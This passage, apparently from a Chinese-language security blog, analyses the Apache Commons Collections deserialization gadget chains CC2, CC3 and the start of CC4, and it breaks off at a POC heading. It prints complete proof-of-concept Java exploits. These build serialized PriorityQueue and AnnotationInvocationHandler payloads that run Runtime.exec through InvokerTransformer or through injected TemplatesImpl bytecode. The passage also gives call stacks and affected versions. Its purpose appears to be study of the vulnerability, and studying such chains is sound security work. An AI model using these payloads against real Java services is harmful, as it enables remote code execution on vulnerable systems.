class="built_in">this</span>.transformer.transform(obj1);</span><br><span class="line">        <span class="type">O</span> <span class="variable">value2</span> <span class="operator">=</span> <span class="built_in">this</span>.transformer.transform(obj2);</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.decorated.compare(value1, value2);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>而<strong>InvokerTransformer</strong>类中的<strong>transform</strong>方法可以进行<strong>invoke</strong>调用。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">InvokerTransformer</span>&lt;I, O&gt; <span class="keyword">implements</span> <span class="title class_">Transformer</span>&lt;I, O&gt;, Serializable &#123;</span><br><span class="line">	<span class="comment">// ...</span></span><br><span class="line">    <span class="keyword">public</span> O <span class="title function_">transform</span><span class="params">(Object input)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (input == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                Class&lt;?&gt; cls = input.getClass();</span><br><span class="line">                <span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> cls.getMethod(<span class="built_in">this</span>.iMethodName, <span class="built_in">this</span>.iParamTypes);</span><br><span class="line">                <span class="keyword">return</span> method.invoke(input, <span class="built_in">this</span>.iArgs);</span><br><span class="line">            &#125; <span class="comment">// ...</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>因此当<strong>obj1</strong>可控时，可以构造合适的<strong>InvokerTransformer</strong>类对象赋给<strong>obj1</strong>来进行反射调用。</p>
<p>分析至此，接下来还需要可触发<strong>TransformingComparator</strong>类中<strong>compare</strong>方法的调用链，<strong>CC2</strong>中使用的是<strong>PriorityQueue</strong>。</p>
<h3 id="priorityqueue">PriorityQueue</h3>
<p><strong>writeObject</strong>方法中会将<strong>queue</strong>成员变量序列化，此处可用反射调用，因此可控。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">writeObject</span><span class="params">(java.io.ObjectOutputStream s)</span></span><br><span class="line">    <span class="keyword">throws</span> java.io.IOException &#123;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; size; i++)</span><br><span class="line">        s.writeObject(queue[i]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>readObject</strong>方法对传入的<strong>ObjectInputStream</strong>进行反序列化然后赋值给<strong>queue</strong>数组。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(java.io.ObjectInputStream s)</span></span><br><span class="line">    <span class="keyword">throws</span> java.io.IOException, ClassNotFoundException &#123;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; size; i++)</span><br><span class="line">        queue[i] = s.readObject();</span><br><span class="line">    heapify();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>heapify</strong>方法中<strong>queue</strong>可控，此处<strong>size</strong>需要大于等于<strong>2</strong>，否则无法进入<strong>for</strong>循环。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">heapify</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> (size &gt;&gt;&gt; <span class="number">1</span>) - <span class="number">1</span>; i &gt;= <span class="number">0</span>; i--)</span><br><span class="line">        siftDown(i, (E) queue[i]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>comparator</strong>不为<strong>null</strong>时进入<strong>siftDownUsingComparator</strong>函数，此处<strong>x</strong>可控，为<strong>heapify</strong>调用传来的<strong>queue</strong>。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">siftDown</span><span class="params">(<span class="type">int</span> k, E x)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (comparator != <span class="literal">null</span>)</span><br><span class="line">        siftDownUsingComparator(k, x);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        siftDownComparable(k, x);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>进入<strong>siftDownUsingComparator</strong>函数，跟进调用<strong>comparator</strong>类的<strong>compare</strong>函数,
同时<strong>x</strong>可控。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">siftDownUsingComparator</span><span class="params">(<span class="type">int</span> k, E x)</span> &#123;</span><br><span class="line">    <span class="type">int</span> <span class="variable">half</span> <span class="operator">=</span> size &gt;&gt;&gt; <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">while</span> (k &lt; half) &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">child</span> <span class="operator">=</span> (k &lt;&lt; <span class="number">1</span>) + <span class="number">1</span>;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">c</span> <span class="operator">=</span> queue[child];</span><br><span class="line">        <span class="type">int</span> <span class="variable">right</span> <span class="operator">=</span> child + <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">if</span> (right &lt; size &amp;&amp;</span><br><span class="line">            comparator.compare((E) c, (E) queue[right]) &gt; <span class="number">0</span>)</span><br><span class="line">            c = queue[child = right];</span><br><span class="line">        <span class="keyword">if</span> (comparator.compare(x, (E) c) &lt;= <span class="number">0</span>)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        queue[k] = c;</span><br><span class="line">        k = child;</span><br><span class="line">    &#125;</span><br><span class="line">    queue[k] = x;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>综上所述，利用反射，设置<strong>comparator</strong>为<strong>TransformingComparator</strong>，同时<strong>x</strong>可控，那么这样就可以利用<strong>InvokerTransformer</strong>触发任意类的任意方法。</p>
<p>因此可以利用<strong>CC1</strong>中的前半段链，反射控制<strong>queue</strong>进行触发。于是得到一个<strong>CC1.5</strong>（。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.comparators.TransformingComparator;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.InvokerTransformer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.PriorityQueue;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(<span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;</span><br><span class="line">                        String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;</span><br><span class="line">                        <span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;</span><br><span class="line">                        Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;</span><br><span class="line">                        <span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;open -a Calculator&quot;</span>&#125;)&#125;);</span><br><span class="line">        <span class="type">TransformingComparator</span> <span class="variable">transformingComparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TransformingComparator</span>(chain);</span><br><span class="line">        <span class="comment">// 也可通过构造函数直接进行传入</span></span><br><span class="line">        <span class="comment">// PriorityQueue queue = new PriorityQueue(1, transformingComparator);</span></span><br><span class="line">        <span class="comment">// queue中添加两个，因为上面分析进入siftDown需要size大于等于2</span></span><br><span class="line">        <span class="type">PriorityQueue</span> <span class="variable">queue</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>(<span class="number">1</span>);</span><br><span class="line">        queue.add(<span class="number">1</span>);</span><br><span class="line">        queue.add(<span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.util.PriorityQueue&quot;</span>).getDeclaredField(<span class="string">&quot;comparator&quot;</span>);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(queue, transformingComparator);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">ObjectOutputStream</span> <span class="variable">outputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;./evil.bin&quot;</span>));</span><br><span class="line">            outputStream.writeObject(queue);</span><br><span class="line">            outputStream.close();</span><br><span class="line"></span><br><span class="line">            <span class="type">ObjectInputStream</span> <span class="variable">inputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;./evil.bin&quot;</span>));</span><br><span class="line">            inputStream.readObject();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="commonscollections3">CommonsCollections3</h1>
<p><strong>CC1+CC2=CC3</strong>。</p>
<h2 id="影响版本-2">影响版本</h2>
<p><strong>JDK&lt;8u71</strong></p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>commons-collections<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-collections<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>
<h2 id="poc-3">POC</h2>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassClassPath;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InstantiateTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC3</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 字节码</span></span><br><span class="line">        <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">        pool.insertClassPath(<span class="keyword">new</span> <span class="title class_">ClassClassPath</span>(AbstractTranslet.class));</span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">cc</span> <span class="operator">=</span> pool.makeClass(<span class="string">&quot;Cat&quot;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> <span class="string">&quot;java.lang.Runtime.getRuntime().exec(\&quot;open -a Calculator\&quot;);&quot;</span>;</span><br><span class="line">        cc.makeClassInitializer().insertBefore(cmd);</span><br><span class="line">        <span class="type">String</span> <span class="variable">randomClassName</span> <span class="operator">=</span> <span class="string">&quot;EvilCat&quot;</span> + System.nanoTime();</span><br><span class="line">        cc.setName(randomClassName);</span><br><span class="line">        cc.setSuperclass(pool.get(AbstractTranslet.class.getName()));</span><br><span class="line"></span><br><span class="line">        <span class="comment">// CC2 _tfactory成员变量会在反序列化调用构造方法时自动创建赋值</span></span><br><span class="line">        <span class="type">byte</span>[] classBytes = cc.toBytecode();</span><br><span class="line">        <span class="type">byte</span>[][] targetByteCodes = <span class="keyword">new</span> <span class="title class_">byte</span>[][] &#123;classBytes&#125;;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> TemplatesImpl.class.newInstance();</span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_bytecodes&quot;</span>, targetByteCodes);</span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;name&quot;</span>);</span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_class&quot;</span>, <span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chain</span> <span class="operator">=</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Transformer</span>[] &#123;</span><br><span class="line">                            <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(TrAXFilter.class),</span><br><span class="line">                            <span class="keyword">new</span> <span class="title class_">InstantiateTransformer</span>(</span><br><span class="line">                                    <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;Templates.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123;templates&#125;)</span><br><span class="line">                        &#125;);</span><br><span class="line"></span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">innerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">LazyMap</span> <span class="variable">map</span> <span class="operator">=</span> (LazyMap) LazyMap.decorate(innerMap, chain);</span><br><span class="line"></span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">handlerConstructor</span> <span class="operator">=</span></span><br><span class="line">                Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>)</span><br><span class="line">                        .getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        handlerConstructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">InvocationHandler</span> <span class="variable">mapHandler</span> <span class="operator">=</span></span><br><span class="line">                (InvocationHandler) handlerConstructor.newInstance(Override.class, map);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">proxyMap</span> <span class="operator">=</span></span><br><span class="line">                (Map)</span><br><span class="line">                        Proxy.newProxyInstance(</span><br><span class="line">                                ClassLoader.getSystemClassLoader(),</span><br><span class="line">                                <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;Map.class&#125;,</span><br><span class="line">                                mapHandler);</span><br><span class="line"></span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">AnnotationInvocationhandlerConstructor</span> <span class="operator">=</span></span><br><span class="line">                Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>)</span><br><span class="line">                        .getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        AnnotationInvocationhandlerConstructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">InvocationHandler</span> <span class="variable">handler</span> <span class="operator">=</span></span><br><span class="line">                (InvocationHandler)</span><br><span class="line">                        AnnotationInvocationhandlerConstructor.newInstance(</span><br><span class="line">                                Override.class, proxyMap);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">ObjectOutputStream</span> <span class="variable">outputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;./CC3&quot;</span>));</span><br><span class="line">            outputStream.writeObject(handler);</span><br><span class="line">            outputStream.close();</span><br><span class="line">            <span class="type">ObjectInputStream</span> <span class="variable">inputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;./CC3&quot;</span>));</span><br><span class="line">            inputStream.readObject();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(<span class="keyword">final</span> Object obj, <span class="keyword">final</span> String fieldName, <span class="keyword">final</span> Object value)</span></span><br><span class="line">            <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">final</span> <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> getField(obj.getClass(), fieldName);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Field <span class="title function_">getField</span><span class="params">(<span class="keyword">final</span> Class&lt;?&gt; clazz, <span class="keyword">final</span> String fieldName)</span> &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            field = clazz.getDeclaredField(fieldName);</span><br><span class="line">            field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (NoSuchFieldException ex) &#123;</span><br><span class="line">            <span class="keyword">if</span> (clazz.getSuperclass() != <span class="literal">null</span>) field = getField(clazz.getSuperclass(), fieldName);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> field;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="调用栈-3">调用栈</h2>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">exec:<span class="number">347</span>, Runtime (java.lang)</span><br><span class="line">&lt;clinit&gt;:-<span class="number">1</span>, EvilCat536701456497875</span><br><span class="line">newInstance0:-<span class="number">1</span>, NativeConstructorAccessorImpl (sun.reflect)</span><br><span class="line">newInstance:<span class="number">62</span>, NativeConstructorAccessorImpl (sun.reflect)</span><br><span class="line">newInstance:<span class="number">45</span>, DelegatingConstructorAccessorImpl (sun.reflect)</span><br><span class="line">newInstance:<span class="number">422</span>, Constructor (java.lang.reflect)</span><br><span class="line">newInstance:<span class="number">442</span>, Class (java.lang)</span><br><span class="line">getTransletInstance:<span class="number">455</span>, TemplatesImpl (com.sun.org.apache.xalan.internal.xsltc.trax)</span><br><span class="line">newTransformer:<span class="number">486</span>, TemplatesImpl (com.sun.org.apache.xalan.internal.xsltc.trax)</span><br><span class="line">&lt;init&gt;:<span class="number">64</span>, TrAXFilter (com.sun.org.apache.xalan.internal.xsltc.trax)</span><br><span class="line">newInstance0:-<span class="number">1</span>, NativeConstructorAccessorImpl (sun.reflect)</span><br><span class="line">newInstance:<span class="number">62</span>, NativeConstructorAccessorImpl (sun.reflect)</span><br><span class="line">newInstance:<span class="number">45</span>, DelegatingConstructorAccessorImpl (sun.reflect)</span><br><span class="line">newInstance:<span class="number">422</span>, Constructor (java.lang.reflect)</span><br><span class="line">transform:<span class="number">105</span>, InstantiateTransformer (org.apache.commons.collections.functors)</span><br><span class="line">transform:<span class="number">122</span>, ChainedTransformer (org.apache.commons.collections.functors)</span><br><span class="line">get:<span class="number">151</span>, LazyMap (org.apache.commons.collections.map)</span><br><span class="line">invoke:<span class="number">77</span>, AnnotationInvocationHandler (sun.reflect.annotation)</span><br><span class="line">entrySet:-<span class="number">1</span>, $Proxy0 (com.sun.proxy)</span><br><span class="line">readObject:<span class="number">444</span>, AnnotationInvocationHandler (sun.reflect.annotation)</span><br><span class="line">invoke0:-<span class="number">1</span>, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:<span class="number">62</span>, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:<span class="number">43</span>, DelegatingMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:<span class="number">497</span>, Method (java.lang.reflect)</span><br><span class="line">invokeReadObject:<span class="number">1058</span>, ObjectStreamClass (java.io)</span><br><span class="line">readSerialData:<span class="number">1900</span>, ObjectInputStream (java.io)</span><br><span class="line">readOrdinaryObject:<span class="number">1801</span>, ObjectInputStream (java.io)</span><br><span class="line">readObject0:<span class="number">1351</span>, ObjectInputStream (java.io)</span><br><span class="line">readObject:<span class="number">371</span>, ObjectInputStream (java.io)</span><br><span class="line">main:<span class="number">72</span>, CC3</span><br></pre></td></tr></table></figure>
<h2 id="前置知识-3">前置知识</h2>
<h3 id="traxfilter">TrAXFilter</h3>
<p><strong>TrAXFilter</strong>类的构造方法接收传参为<strong>Templates</strong>类，且构造过程中会调用<strong>newTransformer</strong>方法，而该方法会触发加载恶意字节码，导致命令执行。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">TrAXFilter</span><span class="params">(Templates templates)</span> <span class="keyword">throws</span> TransformerConfigurationException</span><br><span class="line">&#123;</span><br><span class="line">    _templates = templates;</span><br><span class="line">    _transformer = (TransformerImpl) templates.newTransformer();</span><br><span class="line">    _transformerHandler = <span class="keyword">new</span> <span class="title class_">TransformerHandlerImpl</span>(_transformer);</span><br><span class="line">    _useServicesMechanism = _transformer.useServicesMechnism();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="instantiatetransformer">InstantiateTransformer</h3>
<p>在<strong>InstantiateTransformer</strong>类中，<strong>transform</strong>方法调用了<strong>getConstructor</strong>方法来构造对象。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">InstantiateTransformer</span><span class="params">(Class[] paramTypes, Object[] args)</span> &#123;</span><br><span class="line">    <span class="built_in">this</span>.iParamTypes = paramTypes;</span><br><span class="line">    <span class="built_in">this</span>.iArgs = args;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> Object <span class="title function_">transform</span><span class="params">(Object input)</span> &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (!(input <span class="keyword">instanceof</span> Class)) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">FunctorException</span>(<span class="string">&quot;InstantiateTransformer: Input object was not an instanceof Class, it was a &quot;</span> + (input == <span class="literal">null</span> ? <span class="string">&quot;null object&quot;</span> : input.getClass().getName()));</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="type">Constructor</span> <span class="variable">con</span> <span class="operator">=</span> ((Class)input).getConstructor(<span class="built_in">this</span>.iParamTypes);</span><br><span class="line">            <span class="keyword">return</span> con.newInstance(<span class="built_in">this</span>.iArgs);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (NoSuchMethodException var6) &#123;</span><br><span class="line">        <span class="comment">// ...</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="分析总结">分析总结</h2>
<p>根据<strong>POC</strong>和上面两个类的介绍，很明显的可以看出来，<strong>CC3</strong>就是缝合了<strong>CC2</strong>的前半部分和<strong>CC1</strong>的后半部分，不同之处就仅在于这个调用链的设置。</p>
<p>利用<strong>ConstantTransformer</strong>类将<strong>TrAXFilter.class</strong>作为<strong>InstantiateTransformer</strong>类的输入。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">ChainedTransformer</span> <span class="variable">chain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(<span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(TrAXFilter.class),</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">InstantiateTransformer</span>(<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Templates.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;templates&#125;)</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
<p>而后在<strong>transform</strong>方法中调用了<strong>getConstructor</strong>方法，并将<strong>templates</strong>恶意字节码传入来构造<strong>TrAXFilter</strong>类，最后在<strong>TrAXFilter</strong>类的构造方法中执行恶意代码。</p>
<h1 id="commonscollections4">CommonsCollections4</h1>
<p><strong>CC4</strong> 在 <strong>CC2</strong>
上做了一些细微的改动。</p>
<h2 id="影响版本-3">影响版本</h2>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.commons<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-collections4<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>4.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.javassist<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>javassist<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.25.0-GA<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>
<h2 id="poc-4">POC</h2>
